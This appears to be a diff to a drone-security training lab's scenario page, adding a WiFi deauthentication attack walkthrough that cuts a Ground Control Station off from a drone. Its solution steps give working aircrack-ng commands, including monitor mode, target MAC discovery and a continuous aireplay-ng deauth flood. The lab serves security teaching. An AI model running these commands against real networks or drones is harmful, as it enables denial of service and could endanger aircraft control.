@@ -1,22 +1,51 @@
-title: Wireless Deauthentication
-description: Scenario Under development
+title: Wifi Deauth Attack
+order: 2
+description: Disrupting the communication between the Ground Control Station (GCS) and the drone by performing a deauthentication attack on the WiFi network.
 breadcrumb:
   - text: Attack Scenarios
     link: /attacks
-  - text: Denial of Service
-  - text: Wireless Deauthentication
+  - text: Network
+  - text: Wifi Deauth Attack
 
 sections:
   - title: Description
     content: |
-      Scenario Under development
+      A WiFi deauthentication attack targets the communication between two devices on a WiFi network. 
+      By sending deauthentication frames to one or both devices, the attacker forces them to disconnect 
+      from the network. This can be particularly disruptive for systems that rely on continuous network 
+      connectivity, such as drones controlled by a Ground Control Station (GCS) via WiFi.
 
   - title: Resources
-    content: []
+    content:
+      - text: Aircrack-ng Suite
+        link: https://www.aircrack-ng.org/
 
   - title: Solution Guide
     collapsible: true
     steps:
-      - title: Reveal Solution (Spoiler Alert)
+      - title: Step 1. Setup
         description: |
-          <!-- TODO -->
+          Ensure you have the Aircrack-ng suite installed and a compatible WiFi adapter.
+          ```sudo apt-get update
+          sudo apt-get install aircrack-ng
+          ```
+
+      - title: Step 2. Enable Monitor Mode
+        description: |
+          Your WiFi adapter should already be put into monitor mode (wlan0mon) however, if it is not you can put your WiFi adapter into monitor mode to capture network traffic.
+          ```sudo airmon-ng start wlan0
+          ```
+
+      - title: Step 3. Identify Target Devices
+        description: |
+          Use `airodump-ng` to scan for the GCS and access point MAC addresses.
+          ```sudo airodump-ng wlan0mon
+          ```
+          Identify the MAC address of the companion computer (which is hosting the AP (access point) and the GCS (ground control station). Note the channel number should be on 6 (e.g., `-c 6`).
+
+      - title: Step 4. Perform Deauth Attack
+        description: |
+          Execute the deauth attack to disconnect the GCS from the network.
+          ```sudo aireplay-ng --deauth 0 -a <AP_MAC> -c <GCS_MAC> wlan0mon
+          ```
+          Replace `<AP_MAC>` with the MAC address of the access point and `<GCS_MAC>` with the MAC address of the GCS.
